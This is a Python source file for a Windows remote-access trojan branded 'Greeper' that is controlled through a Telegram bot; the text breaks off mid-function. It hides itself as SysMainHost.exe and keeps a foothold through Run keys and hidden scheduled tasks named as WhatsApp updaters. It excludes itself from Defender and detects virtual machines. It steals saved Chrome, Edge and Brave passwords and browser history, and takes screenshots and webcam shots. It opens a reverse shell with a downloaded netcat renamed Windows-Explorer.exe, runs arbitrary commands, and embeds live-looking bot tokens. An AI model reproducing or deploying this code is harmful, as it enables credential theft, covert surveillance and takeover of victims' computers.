try:
    import telebot
    import os
    import subprocess as sp
    sp.Popen(["powershell","-command",f"""Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\TaskScheduler" -Name "ShowHiddenTasks" -Type DWORD -Value 0 -Force -ErrorAction SilentlyContinue"""], creationflags=sp.CREATE_NO_WINDOW)
    sp.Popen(["powershell", "Add-MpPreference", "-ExclusionPath", os.path.abspath(__file__)],creationflags=sp.CREATE_NO_WINDOW)
    persistant_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\persistant"
    backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\SysMainHost.exe"
    if os.path.exists(persistant_location):
        try:
            sp.Popen([
                "powershell",
                "-Command",
                f"""$taskName = 'WhatsappUpdaterOnceCheck'; if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{ Unregister-ScheduledTask -TaskName $taskName -Confirm:$false }}; $action = New-ScheduledTaskAction -Execute '{backdoor_location}'; $dailyTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 1); Register-ScheduledTask -Action $action -Trigger $dailyTrigger -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -TaskName $taskName -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances parallel)"""
            ], creationflags=sp.CREATE_NO_WINDOW)
        except Exception as e:
            pass
    import requests
    import random
    import platform
    import re
    from urllib.request import Request, urlopen
    import pyautogui
    from datetime import datetime
    import shutil
    import sys
    from multiprocessing import Process
    import threading
    import json
    import ctypes
    from ctypes.wintypes import HKEY
    import time
    from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
    import win32api
    import win32process
    import psutil
    import win32pdh
    from winreg import *
    from ctypes import *
    #disctopia
    from imageio import get_reader, imwrite
    import os
    import subprocess as sp
    import requests
    import platform
    import re
    from urllib.request import Request, urlopen
    import pyautogui
    from datetime import datetime
    import shutil
    import sys
    import threading
    import json
    import ctypes
    import random
    #credentials
    import os
    import json
    import base64
    import sqlite3
    import shutil
    from datetime import timezone, datetime, timedelta
    import json
    import win32crypt
    from Crypto.Cipher import AES

    class disctopi:
        def autoPersistent(self):
            backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\SysMainHost.exe"
            if not os.path.exists(backdoor_location):
                shutil.copyfile(sys.executable, backdoor_location)
                sp.Popen(['powershell', '-Command', 'Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "update" -Type String -Value "' + backdoor_location + '" -Force -ErrorAction SilentlyContinue'], creationflags=sp.CREATE_NO_WINDOW)
                #@#@sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',shell=True)


        def isVM(self):
            rules = ['Virtualbox', 'vmbox', 'vmware']
            command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
                               stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                               creationflags=0x08000000)
            out, err = command.communicate()
            command.wait()
            for rule in rules:
                if re.search(rule, out, re.IGNORECASE):
                    return True
            return False


        def isAdmin(self):
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin


        def getIP(self):
            try:
                IP = urlopen(Request("https://ipv4.myip.wtf/text")).read().decode().strip()
            except Exception:
                IP = "None"
            return IP


        def getBits(self):
            try:
                BITS = platform.architecture()[0]
            except Exception:
                BITS = "None"
            return BITS


        def getUsername(self):
            try:
                USERNAME = os.getlogin()
            except Exception:
                USERNAME = "None"
            return USERNAME


        def getOS(self):
            try:
                OS = platform.platform()
            except Exception:
                OS = "None"
            return OS


        def getCPU(self):
            try:
                CPU = platform.processor()
            except Exception:
                CPU = "None"
            return CPU


        def getHostname(self):
            try:
                HOSTNAME = platform.node()
            except Exception:
                HOSTNAME = "None"
            return HOSTNAME


        def createConfig(self):
            try:
                path = fr'"C:\Users\{disctopia.getUsername()}\.config"'
                new_path = path[1:]
                new_path = new_path[:-1]
                os.mkdir(new_path)
                sp.Popen(['powershell','-command',f'attrib +h {path}'], creationflags=sp.CREATE_NO_WINDOW)
                #os.system(f"attrib +h {path}")
                path = fr'C:\Users\{disctopia.getUsername()}\.config\uploads'
                os.mkdir(path)
                return True

            except WindowsError as e:
                if e.winerror == 183:
                    return False
        def id(self):
            cfgpath = fr"C:\Users\{disctopia.getUsername()}\.config"
            path = fr"C:\Users\{disctopia.getUsername()}\.config\ID"

            def createID(file):
                ID = file.read()
                if ID == "":
                    ID = random.randint(1, 10000)
                    file.write(str(ID))
                return ID
            try:    
                with open(path, "r+") as IDfile:
                    return createID(IDfile)

            except Exception:
                if os.path.exists(cfgpath):
                    with open(path, "w+") as IDfile:
                        return createID(IDfile)
                else:
                    os.mkdir(cfgpath)
                    with open(path, "w+") as IDfile:
                        return createID(IDfile)


        def cd(self,path):
            try:
                os.chdir(fr"{path}")
                return "Directory changed sucessfully"
            except FileNotFoundError:
                return "Directory not found"
            except PermissionError:
                return "Permission denied"
            except Exception as e:
                return f"An error occurred: {str(e)}"


        def process(self):
            result = sp.Popen("tasklist", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                              creationflags=0x08000000)
            out, err = result.communicate()
            result.wait()
            return out



        def upload(self,url, name):
            path = fr'C:\Users\{disctopia.getUsername()}\.config\uploads'
            try:
                r = requests.get(url, allow_redirects=True, verify=False)
                open(fr"{path}\{name}", 'wb').write(r.content)
                return True
            except Exception as e:
                return e



        def screenshot(self):
            try:
                Screenshot = pyautogui.screenshot()
                path = os.environ["temp"] + "\\s.png"
                Screenshot.save(path)
                return path
            except Exception as e:
                return False


        def webshot(self):
            try:
                cam = get_reader('<video0>')
                frame = cam.get_data(0)
                path = os.path.join(os.environ["temp"], "p.png")
                imwrite(path, frame)
                cam.close()
                return path
            except Exception as e:
                print(e)
                return False


        def creds(self,name1,name2):  
            try:
                data = credentials.stealcreds(name1,name2)
                path = os.environ["temp"] + f"\\{name2}_data.json"
                with open(path, 'w+') as outfile:
                    json.dump(data, outfile, indent=4)
                return path
            except Exception:
                return False


        def persistent(self):
            backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\SysMainHost.exe"
            persistant_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\persistant"
            with open(persistant_location,"w") as p:
                p.write("persistant")
            try:
                if not os.path.exists(backdoor_location):
                    shutil.copyfile(sys.executable, backdoor_location)
                    sp.Popen(['powershell', '-Command', 'Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "update" -Type String -Value "' + backdoor_location + '" -Force -ErrorAction SilentlyContinue'], creationflags=sp.CREATE_NO_WINDOW)
                    powershell_command = f"""$taskName = "WhatsappUpdaterCheck"; if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{ Unregister-ScheduledTask -TaskName $taskName -Confirm:$false }}; $action = New-ScheduledTaskAction -Execute "{backdoor_location}"; $dailyTrigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $action -Trigger $dailyTrigger -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -TaskName $taskName -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances parallel)"""
                    sp.Popen(['powershell', '-Command', powershell_command], creationflags=sp.CREATE_NO_WINDOW)
                    sp.Popen(['powershell', 'Add-MpPreference', '-ExclusionPath', backdoor_location],creationflags=sp.CREATE_NO_WINDOW)
                    return True
                else:
                    os.remove(backdoor_location)
                    shutil.copyfile(sys.executable, backdoor_location)
                    powershell_command = f"""$taskName = "WhatsappUpdaterCheck"; if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{ Unregister-ScheduledTask -TaskName $taskName -Confirm:$false }}; $action = New-ScheduledTaskAction -Execute "{backdoor_location}"; $dailyTrigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $action -Trigger $dailyTrigger -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -TaskName $taskName -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances parallel)"""
                    sp.Popen(['powershell', '-Command', powershell_command], creationflags=sp.CREATE_NO_WINDOW)
                    sp.Popen(['powershell', 'Add-MpPreference', '-ExclusionPath', backdoor_location],creationflags=sp.CREATE_NO_WINDOW)
                    return "already-enabled"
            except Exception as e:
                return e


        def cmd(self,command):
            try:
                result = sp.Popen(command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,text=True, creationflags=sp.CREATE_NO_WINDOW)
                out, err = result.communicate()
                result.wait()
                if not err:
                    return out if out else "Command executed successfully with no output."
                else:
                    return err
            except:
                return "The command may have been executed sucessfully"


        def selfdestruct(self):
            try:
                sp.Popen(['powershell', '-Command', 'Unregister-ScheduledTask -TaskName WhatsappUpdaterCheck -Confirm:$false -ErrorAction SilentlyContinue'], creationflags=sp.CREATE_NO_WINDOW)
                sp.Popen(['powershell', '-Command', 'Unregister-ScheduledTask -TaskName WhatsappUpdaterOnceCheck -Confirm:$false -ErrorAction SilentlyContinue'], creationflags=sp.CREATE_NO_WINDOW)
                update_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\SysMainHost.exe"
                config_location = fr'C:\Users\{disctopia.getUsername()}\.config'
                script_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\script.ps1"
                persistant_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\persistant"
                if os.path.exists(script_location):
                    os.remove(script_location)
                if os.path.exists(persistant_location):
                    os.remove(persistant_location)
                if os.path.exists(update_location):
                    os.remove(update_location)
                if os.path.exists(config_location):
                    shutil.rmtree(config_location)
                sp.Popen(['powershell', '-Command', 'Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "update" -Force -ErrorAction SilentlyContinue'], creationflags=sp.CREATE_NO_WINDOW)
                #@#@sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
                return True

            except Exception as e:
                return e


        def location(self):
            try:
                response = requests.get("https://json.ipv4.myip.wtf")
                response.raise_for_status()
                return response
            except Exception:
                return False


        def revshell(self,ip, port):
            def exec(IP, PORT):
                if not os.path.exists(os.environ["temp"] + '\\Windows-Explorer.exe'):
                    r = requests.get("https://github.com/int0x33/nc.exe/raw/master/nc64.exe", allow_redirects=True,
                                            verify=False)
                    open(os.environ["temp"] + '\\Windows-Explorer.exe', 'wb').write(r.content)
                else:
                    try:
                        result = sp.Popen(f"{os.environ['temp']}\\Windows-Explorer.exe {IP} {PORT} -e cmd.exe /b",
                                            stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                                            creationflags=0x08000000)
                        out, err = result.communicate()
                        result.wait()
                        return True
                    except Exception:
                        return False


            threading.Thread(target=exec, args=(ip, port)).start()
            return True


        def wallpaper(self,path):
            if path.startswith("http"):
                try:
                    wallpaper_name = f"wallpaper.{path[-3:]}"
                    r = requests.get(path, allow_redirects=True, verify=False)
                    open(fr"C:\Users\{disctopia.getUsername()}\.config\uploads\{wallpaper_name}", 'wb').write(r.content)
                    wallpaper_location = fr"C:\Users\{disctopia.getUsername()}\.config\uploads\{wallpaper_name}"
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_location, 0)
                    return True
                except Exception as e:
                    return e
            else:
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
                    return True
                except Exception as e:
                    return e


        def killproc(self,pid):
            result = sp.Popen(f"taskkill /F /PID {pid}", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE,
                                shell=True, text=True, creationflags=0x08000000)
            out, err = result.communicate()
            result.wait()
            if err:
                return err
            else:
                return True
    disctopia = disctopi()
    disctopia.persistent()


    class credentials:
        def my_chrome_datetime(self,time_in_mseconds):
            return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

        def encryption_key(self,name1,name2):
            localState_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", f"{name1}", f"{name2}",
                                            "User Data", "Local State")
            with open(localState_path, "r", encoding="utf-8") as file:
                local_state_file = file.read()
                local_state_file = json.loads(local_state_file)
            ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key

        def decrypt_password(self,enc_password, key):
            try:
                init_vector = enc_password[3:15]
                enc_password = enc_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, init_vector)
                return cipher.decrypt(enc_password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1])
                except:
                    return "No Passwords(logged in with Social Account)"

        def stealcreds(self,name1,name2):
            password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    f"{name1}", f"{name2}", "User Data", "Default", "Login Data")
            shutil.copyfile(password_db_path,"my_chrome_data.db")
            db = sqlite3.connect("my_chrome_data.db")
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
            encp_key = credentials.encryption_key(name1,name2)
            data = {}
            for row in cursor.fetchall():
                site_url = row[0]
                username = row[1]
                password = credentials.decrypt_password(row[2], encp_key)
                date_created = row[3]
                if username or password:
                    data[site_url] = []
                    data[site_url].append({
                        "username": username,
                        "password": password,
                        "date_created": str(credentials.my_chrome_datetime(date_created))
                        })
                else:
                    continue 
            cursor.close()
            db.close()
            os.remove("my_chrome_data.db")
            return data
    credentials = credentials()


    class browserhistory:
        def gethistory(self,name1,name2):
            try:
                history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", f"{name1}", f"{name2}", "User Data", "Default", "History")
                try:
                    db_path=os.environ["temp"]+f"\\{name2}_database.db"
                    shutil.copyfile(history_path,db_path)
                except:
                    pass
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
                path = os.environ["temp"] + f"\\{name2}_history.json"
                with open(path, 'w', encoding="utf-8") as file:
                    for row in cursor.fetchall():
                        url = row[0]
                        title = row[1]
                        visit_count = row[2]
                        file.write(f"URL: {url}\nTitle: {title}\nVisit Count: {visit_count}\n\n")
                cursor.close()
                conn.close()
                os.remove(db_path)
                return path
            except Exception as e:
                return False
    browserhistory = browserhistory()

#    def excp_handler(exception, bot, update):
#        print(f"An exception occurred: {exception}")
#        if "Conflict: terminated by other getUpdates request; make sure that only one bot instance is running" in str(exception):
#            exit()
#            try:
#                sys.exit()
#            except:
#                os._exit(0)

    class ExceptionHandler:
        def __init__(self, bot):
            self.bot = bot

        def handle(self, exception):
            """Handles exceptions raised by the bot."""
            print(f"An exception occurred: {exception}")
            if "Conflict: terminated by other getUpdates request; make sure that only one bot instance is running" in str(exception):
                print("Conflict detected. Exiting...")
                try:
                    sys.exit()
                except:
                    os._exit(0)

    def main():
        try:
            BOT_TOKEN = "7564882844:AAE1GX6XLEQa6WAUaBHmfivpu0Ulv6Cu0W4"
            USER_ID = "1049697109" 
            bot = telebot.TeleBot(BOT_TOKEN)
            exception_handler = ExceptionHandler(bot)
            bot.exception_handler = exception_handler
            bot.send_photo(USER_ID, open(os.getcwd()+"\\tcl\\tix8.4.3\\GPR_LGO.png", 'rb'))
            access_code = ''
            tempaccess=0
            def access():
                if access_code=="":
                    code=''
                    for i in range(5):
                        code+=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','@','#','$','%','&','!','?','~'])
                    return code
            access_code=access()

            def timesup():
                try:
                    file_path = fr'C:\Users\{disctopia.getUsername()}\.config\data.bin'
                    if not os.path.exists(file_path):
                        open(file_path, 'w').close()
                    if os.path.getsize(file_path) == 0:
                        with open(file_path, "w") as file:
                            file.write(datetime.now().strftime("%Y-%m-%d"))
                    else:
                        with open(file_path, "r") as file:
                            file_date = datetime.strptime(file.read().strip(), "%Y-%m-%d")
                        if (datetime.now().date() - file_date.date()).days > 2:
                            bot.send_message(USER_ID,f'Client #{ID} Self Destructed -Payload Expired')
                            try:disctopia.selfdestruct()
                            except:bot.send_message(USER_ID,"Error in file read- self destruct")
                            sys.exit()
                

                except WindowsError as e:
                    bot.send_message(USER_ID,"Error Date write function")
                    bot.send_message(USER_ID,e)
                    if e.winerror == 183:
                        return False
                
            def goodbye():
                if USER_ID!="1049697109":
                    timesup()

            def send_notification():
                now = datetime.now()
                message = f"GREEPER BY G!R!\n\n{MSG} Time: {now.strftime('%d/%m/%Y %H:%M:%S')}\nIP: {disctopia.getIP()}\nBits: {disctopia.getBits()}\nHostname: {disctopia.getHostname()}\nOS: {disctopia.getOS()}\nUsername: {disctopia.getUsername()}\nCPU: {disctopia.getCPU()}\nAdmin: {disctopia.isAdmin()}\nVM: {disctopia.isVM()}\n\nSend /help for commands"
                bot.send_message(USER_ID, message)

            def limited(message):
                if str(message.from_user.id)!="1049697109":
                    persistant_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\persistant"
                    if not os.path.exists(persistant_location):
                        bot.send_message(message.from_user.id,f"This is an Restricted Feature\nYou are not God!\nIf you want access to restricted features ,enter the code sent to God!\nUse /getaccess <code> for temprorary access")
                        try:
                            bot2 = telebot.TeleBot("7808939013:AAF1UYN0AtvVxi1_Rhzdu7l09DIIEnhQE0I")
                            msg=f"Requested temp full access for client {disctopia.getUsername()} #{ID}\nThe Code is {access_code}\nBot Requested code is @{bot.get_me().username}\nOwner is tg://openmessage?user_id={USER_ID}"
                            bot2.send_message("1049697109",msg)
                        except:
                            try:
                                msg=f"Requested temp full access for client #{ID}\nThe Code is {access_code}"
                                bot.send_message("1049697109",msg)
                            except:
                                bot.send_message(message.from_user.id,"Error in sending access code to God!")
                        return "limited"
                    elif os.path.getsize(persistant_location) != 4:
                        bot.send_message(message.from_user.id,f"This is an Restricted Feature\nYou are not God!\nIf you want access to restricted features ,enter the code sent to God!\nUse /getaccess <code> for temprorary access")
                        try:
                            bot2 = telebot.TeleBot("7808939013:AAF1UYN0AtvVxi1_Rhzdu7l09DIIEnhQE0I")
                            msg=f"Requested temp full access for client {disctopia.getUsername()} #{ID}\nThe Code is {access_code}\nBot Requested code is @{bot.get_me().username}\nOwner is tg://openmessage?user_id={USER_ID}"
                            bot2.send_message("1049697109",msg)
                        except:
                            try:
                                msg=f"Requested temp full access for client #{ID}\nThe Code is {access_code}"
                                bot.send_message("1049697109",msg)
                            except:
                                bot.send_message(message.from_user.id,"Error in sending access code to God!")
                        return "limited"
                return "GOD"

            @bot.message_handler(commands=['extend'])
            def extend(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if message.from_user.id==1049697109:
                        bot.reply_to(message,"No restrictions is applied to GOD")
                    else:
                        file_path = fr'C:\Users\{disctopia.getUsername()}\.config\data.bin'
                        with open(file_path, "w") as file:
                            file.write(datetime.now().strftime("%Y-%m-%d"))
                        bot.reply_to(message,"Payload Expiry Extended")

            @bot.message_handler(commands=['getaccess'])
            def getaccess(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    persistant_location = os.environ["appdata"] + "\\Microsoft\\Windows\\CloudStore\\persistant"
                    if USER_ID=="1049697109":
                        bot.reply_to(message,"Remember you are GOD!")
                    if os.path.exists(persistant_location):
                        if os.path.getsize(persistant_location) == 4:
                            bot.reply_to(message,"You already have full access!")
                    else:
                        try:access_code_provided = message.text.replace('/getaccess', '').strip()
                        except:bot.send_message(USER_ID,"No code entered, Enter a code")
                        if access_code_provided == access_code:
                            bot.reply_to(message,"Access Granted Sucessfully!")
                            with open(persistant_location, "w") as file:
                                file.write("FULL")
                            changeaccess()
                        elif access_code_provided == '':
                            bot.reply_to(message,"Please provide the access code")
                        else:
                            bot.reply_to(message,"Incorrect Code, Access Declined")

            def changeaccess():
                try:disctopia.persistent()
                except:bot.send_message(USER_ID,"Error: Cannot get temprorary access...")

            @bot.message_handler(commands=['cmd'])
            def cmd(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if limited(message)=="GOD":
                        arguments = message.text.split()
                        if len(arguments) > 1:
                            command = ' '.join(arguments[1:])
                            if command.startswith('cd') and len(arguments) > 2:
                                reply=disctopia.cd(' '.join(arguments[2:]))
                            elif command.startswith('cd') and len(arguments) == 2:
                                reply=disctopia.cmd(command)
                            else:
                                reply = disctopia.cmd(command)
                            if len(reply) > 4000:
                                path = os.environ["temp"] +"\\response.txt"     
                                with open(path, 'w') as file:
                                    file.write(reply)
                                bot.send_document(message.chat.id, open(path, 'rb'))
                                os.remove(path)
                            else:
                                bot.reply_to(message, reply)
                        else:        
                            bot.reply_to(message, "Please specify all the required parameters: cmd <command>")

            @bot.message_handler(commands=['msg'])
            def msg(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    message_content = ' '.join(message.text.split()[1:]).replace("'", "''")
                    ps_script = f"""
                    Add-Type -AssemblyName System.Windows.Forms;
                    Add-Type -AssemblyName System.Drawing;
                    $form = New-Object System.Windows.Forms.Form;
                    $form.Text = "MSG from Greeper";
                    $form.TopMost = $true;
                    $form.AutoSize = $true;
                    $form.AutoSizeMode = [System.Windows.Forms.AutoSizeMode]::GrowAndShrink;
                    $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen;
                    $label = New-Object System.Windows.Forms.Label;
                    $label.Text = '{message_content}';
                    $label.AutoSize = $true;
                    $label.MaximumSize = New-Object System.Drawing.Size(400, 0);  # Wider maximum width
                    $label.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 12, [System.Drawing.FontStyle]::Regular);
                    $label.Location = New-Object System.Drawing.Point(20, 20);
                    $button = New-Object System.Windows.Forms.Button;
                    $button.Text = "OK";
                    $button.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 12, [System.Drawing.FontStyle]::Regular);
                    $button.Size = New-Object System.Drawing.Size(100, 40);
                    $button.Location = New-Object System.Drawing.Point(150, 80);
                    $button.Add_Click({{ $form.Close() }});
                    $form.Controls.Add($label);
                    $form.Controls.Add($button);
                    [void] $form.ShowDialog();
                    """
                    sp.Popen(
                        ['powershell', '-command', ps_script],
                        creationflags=sp.CREATE_NO_WINDOW
                    )
                    bot.reply_to(message,"Message box displayed sucessfully")

            @bot.message_handler(commands=['webshot'])
            def webshot(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    result = disctopia.webshot()
                    if result != False:
                        bot.send_document(message.chat.id, open(result, 'rb'))
                        os.remove(result)
                    else:
                        bot.reply_to(message, "Error while trying to take a picture")

            @bot.message_handler(commands=['process'])
            def process(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    result = disctopia.process()
                    if len(result) > 4000:
                        path = os.environ["temp"] +"\\response.txt"     
                        with open(path, 'w') as file:
                            file.write(result)
                        bot.send_document(message.chat.id, open(path, 'rb'))
                        os.remove(path)
                    else:
                        bot.reply_to(message, result)

            @bot.message_handler(content_types=['document', 'photo'])
            def handle_file(message):
                try:
                    if message.document:
                        file_id = message.document.file_id
                        file_name = message.document.file_name or file_id
                    elif message.photo:
                        file_id = message.photo[-1].file_id
                        file_name = f"photo_{file_id}.jpg"

                    file_info = bot.get_file(file_id)
                    downloaded_file = bot.download_file(file_info.file_path)
                    save_path = os.path.join(fr'C:\Users\{disctopia.getUsername()}\.config\uploads', file_name)
                    with open(save_path, 'wb') as new_file:
                        new_file.write(downloaded_file)
                    bot.reply_to(message, f"File saved as {save_path}")
                except Exception as e:
                    bot.reply_to(message, f"An error occurred: {e}")

            @bot.message_handler(commands=['upload'])
            def upload(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    arguments = message.text.split()
                    if len(arguments) > 2:
                        url = arguments[1]
                        name = ' '.join(arguments[2:])
                        result = disctopia.upload(url, name)
                        if result:
                            reply = "File uploaded successfully"
                        else:
                            reply = f"Error while trying to upload the file:\n{result}"
                        bot.reply_to(message, reply)
                    else:
                        bot.reply_to(message, "Please specify all the required parameters: upload <url> <name>")

            @bot.message_handler(commands=['screenshot'])
            def screenshot(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    result = disctopia.screenshot()
                    if result != False:
                        bot.send_document(message.chat.id, open(result, 'rb'))
                        os.remove(result)
                    else:
                        bot.reply_to(message, "Error while trying to take a screenshot")

            @bot.message_handler(commands=['creds'])
            def creds(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if str(message.from_user.id) == "1049697109":
                        result = disctopia.creds("Google","Chrome")
                        if result != False:
                            bot.send_document(message.chat.id, open(result, 'rb'))
                            os.remove(result)
                        else:
                            bot.reply_to(message, "Error while trying to get Chrome credentials")

                        result = disctopia.creds("Microsoft","Edge")
                        if result != False:
                            bot.send_document(message.chat.id, open(result, 'rb'))
                            os.remove(result)
                        else:
                            bot.reply_to(message, "Error while trying to get Edge credentials")

                        result = disctopia.creds("BraveSoftware","Brave-Browser")
                        if result != False:
                            bot.send_document(message.chat.id, open(result, 'rb'))
                            os.remove(result)
                        else:
                            bot.reply_to(message, "Error while trying to get Brave credentials")
                    else:
                        try:
                            bot2 = telebot.TeleBot("7808939013:AAF1UYN0AtvVxi1_Rhzdu7l09DIIEnhQE0I")
                            msg=f"Requesting creds for client {disctopia.getUsername()} #{ID}\nBot Requested is @{bot.get_me().username}\nOwner is tg://openmessage?user_id={USER_ID}"
                            bot2.send_message("1049697109",msg)
                            bot.reply_to(message, "You are not allowed to use this command\nContact GOD\n@GodInReach")
                        except:
                            bot.reply_to(message, "You are not allowed to use this command\nBTW somw error occorred\nContact GOD\n@GodInReach")

            @bot.message_handler(commands=['persistent'])
            def persistent(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    result = disctopia.persistent()
                    if result:
                        reply = "Persistence added successfully"
                    else:
                        reply = "Error while trying to add persistence"
                    bot.reply_to(message, reply)

            @bot.message_handler(commands=['agent'])
            def agent(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    bot.reply_to(message, f"Agent#{ID} \nUsername: {disctopia.getUsername()}\nIP: {disctopia.getIP()} \nPayload Owner: {USER_ID}")

            @bot.message_handler(commands=['download'])
            def download(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if limited(message)=="GOD":
                        arguments = message.text.split()
                        if len(arguments) > 1:
                            path = ' '.join(arguments[1:])
                            try:
                                bot.send_document(message.chat.id, open(path, 'rb'))
                            except Exception as e:
                                bot.reply_to(message, "Error while trying to download the file:\n" + str(e))
                        else:
                            bot.reply_to(message, "Please specify all the required parameters: download <path>")

            @bot.message_handler(commands=['terminate'])
            def terminate(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    bot.reply_to(message, f"Agent#{ID} terminated")
                    try:sys.exit()
                    except:os._exit(0)

            @bot.message_handler(commands=['selfdestruct'])
            def selfdestruct(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    result = disctopia.selfdestruct()
                    if result:
                        bot.reply_to(message, "Agent destroyed successfully")
                        try:sys.exit()
                        except:os._exit(0)
                    else:
                        bot.reply_to(message, f"Error while trying to destroy the agent:\n{result}")

            @bot.message_handler(commands=['location'])
            def location(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    response = disctopia.location()
                    if response != False:
                        reply = f"""
IP Based Location on Agent#{ID}
IP: {response.json()['YourFuckingIPAddress']}
Hostname: {response.json()['YourFuckingHostname']}
City: {response.json()['YourFuckingLocation']}
Country: {response.json()['YourFuckingCountryCode']}
ISP: {response.json()['YourFuckingISP']}
                        """
                        bot.reply_to(message, reply)

                    else:
                        bot.reply_to(message, "Error while trying to get location")

            @bot.message_handler(commands=['revshell'])
            def revshell(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if limited(message)=="GOD":
                        arguments = message.text.split()
                        if len(arguments) > 2:
                            ip = arguments[1]
                            port = ' '.join(arguments[2:])
                            result = disctopia.revshell(ip, port)
                            if result:
                                bot.reply_to(message, "Attempting to establish a reverse shell")
                        else:
                            bot.reply_to(message, "Please specify all the required parameters: revshell <ip> <port>")

            @bot.message_handler(commands=['wallpaper'])
            def wallpaper(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    arguments = message.text.split()
                    if len(arguments) > 1:
                        url = ' '.join(arguments[1:])
                        result = disctopia.wallpaper(url)
                        if result:
                            bot.reply_to(message, "Wallpaper changed successfully")
                        else:
                            bot.reply_to(message, f"Error while trying to change the wallpaper:\n{result}")
                    else:
                        bot.reply_to(message, "Please specify all the required parameters: wallpaper <url/path>")

            @bot.message_handler(commands=['killproc'])
            def killproc(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    arguments = message.text.split()
                    if len(arguments) > 1:
                        pid = ' '.join(arguments[1:])
                        result = disctopia.killproc(pid)
                        if result:
